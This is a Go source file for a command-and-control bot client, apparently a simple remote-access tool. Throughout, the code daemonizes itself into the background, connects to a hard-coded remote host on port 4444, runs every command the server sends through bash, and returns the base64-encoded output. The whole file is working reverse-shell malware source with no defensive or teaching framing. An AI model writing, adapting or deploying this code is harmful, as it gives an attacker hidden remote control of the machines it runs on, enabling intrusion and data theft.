package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
)

const (
	RHOST = "127.0.0.1"
)

func ExecuteCommand(command string) string {
	fmt.Printf("executing: %v\n", command)
	var out []byte
	var err error
	if runtime.GOOS != "windows" {
		out, err = exec.Command("bash", "-c", command).Output()
	} else {
		out, err = exec.Command(command).Output()
	}
	if err != nil {
		fmt.Printf("result error: %v\n", err)
		return "Error executing command on bot: " + err.Error()
	}

	fmt.Printf("result: %v\n", string(out))
	return string(out)
}

func main() {
	// Parent process - will fork and daemonize itself
	if os.Getenv("DAEMONIZED") != "1" {
		cmd := exec.Command(os.Args[0])
		cmd.Env = append(os.Environ(), "DAEMONIZED=1")

		if runtime.GOOS != "windows" {
			cmd.SysProcAttr = &syscall.SysProcAttr{
				Setsid: true,
			}
		}

		err := cmd.Start()
		if err != nil {
			fmt.Println("Error starting as daemon:", err)
			os.Exit(1)
		}

		if runtime.GOOS == "windows" {
			err = cmd.Process.Release()
			if err != nil {
				fmt.Println("Error releasing process:", err)
			}
		}

		fmt.Println("Daemon started with PID", cmd.Process.Pid)
		os.Exit(0)
		return
	}

	// Execute bot
	conn, err := net.Dial("tcp", RHOST+":4444")
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	reader := bufio.NewReader(conn)
	conn.Write([]byte("yes\n"))

	for {
		cmd, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command from server:", err)
			continue
		}
		cmd = strings.TrimSpace(cmd)

		if cmd == "exit" {
			fmt.Println("Exiting...")
			return
		}

		result := ExecuteCommand(cmd)
		resultEncoded := base64.StdEncoding.EncodeToString([]byte(result))
		_, err = conn.Write([]byte(resultEncoded + "\n"))
		if err != nil {
			fmt.Println("Error sending result:", err)
			continue
		}
	}
}
